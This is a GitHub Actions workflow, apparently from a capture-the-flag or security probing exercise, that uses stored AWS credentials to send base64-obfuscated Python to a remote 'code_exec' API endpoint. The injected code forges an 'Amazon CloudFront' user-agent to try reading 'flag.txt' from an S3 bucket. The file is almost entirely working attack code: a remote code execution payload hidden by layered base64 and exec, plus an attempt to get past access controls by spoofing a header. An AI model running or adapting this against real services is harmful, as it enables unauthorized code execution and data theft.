name: Stage2-CodeExec-Signed-UA

on:
  push:
    branches:
      - corgi
  workflow_dispatch:

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest

    env:
      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
      AWS_SESSION_TOKEN: ${{ secrets.AWS_SESSION_TOKEN }}
      AWS_DEFAULT_REGION: us-east-1

    steps:
      - name: Test signed S3 request with custom User-Agent
        shell: bash
        run: |
          set +e

          python3 -m pip install boto3 requests requests-aws4auth --quiet

          python3 - <<'PY'
          import base64
          import time
          import requests
          import boto3
          from requests_aws4auth import AWS4Auth
          from botocore.config import Config

          API = "https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec"

          inner = r'''
          import time
          import boto3
          from botocore.config import Config

          try:
              client = boto3.client(
                  "s3",
                  region_name="us-east-1",
                  endpoint_url="https://s3.us-east-1.amazonaws.com",
                  config=Config(
                      signature_version="s3v4",
                      user_agent_extra="Amazon CloudFront"
                  )
              )

              result = client.get_object(
                  Bucket="userad88e2b168aa387e",
                  Key="flag.txt"
              )

              data = result["Body"].read()

              print("SIGNED_CUSTOM_UA_SUCCESS")
              print("BYTES=" + str(len(data)))
              time.sleep(5)

          except Exception as error:
              print("SIGNED_CUSTOM_UA_FAILURE")
              print(repr(error))
          '''

          encoded_inner = base64.b64encode(inner.encode()).decode()

          code = (
              "import base64; "
              "exec(compile("
              "base64.b64decode("
              + repr(encoded_inner)
              + ").decode(),"
              "'probe.py','exec'))"
          )

          encoded_code = base64.b64encode(code.encode()).decode()

          credentials = boto3.Session().get_credentials().get_frozen_credentials()

          auth = AWS4Auth(
              credentials.access_key,
              credentials.secret_key,
              "us-east-1",
              "execute-api",
              session_token=credentials.token
          )

          started = time.monotonic()

          response = requests.post(
              API,
              json={"code": encoded_code},
              auth=auth,
              timeout=20
          )

          elapsed = time.monotonic() - started

          print("HTTP=" + str(response.status_code))
          print("ELAPSED=%.2f" % elapsed)
          print(response.text)
          PY
